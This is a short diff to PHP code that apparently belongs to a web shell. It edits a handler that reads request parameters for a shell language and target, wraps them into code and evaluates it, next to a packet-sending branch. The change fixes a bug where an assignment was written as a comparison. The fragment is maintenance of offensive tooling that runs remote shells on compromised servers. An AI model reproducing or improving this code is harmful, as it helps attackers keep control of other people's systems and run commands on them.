@@ -90,15 +90,14 @@ if(isset($p['rsLang']) && isset($p['rsArgs'])){
 			$code = "?><?php \$target = \"".$rsArgs."\"; ?>".$code;
 			$res = eval_go($rsLang, $code, "", "");
 		}
-	}
-	else{
+	}else{
 		$code = get_resource("rs_".$rsLang);
 		if($code!==false){
 			$res = eval_go($rsLang, $code, "", $rsArgs);
 		}
 	}
 
-	if($res===false) $res == "error";
+	if($res===false) $res = "error";
 	output(html_safe($res));
 }
 elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])){
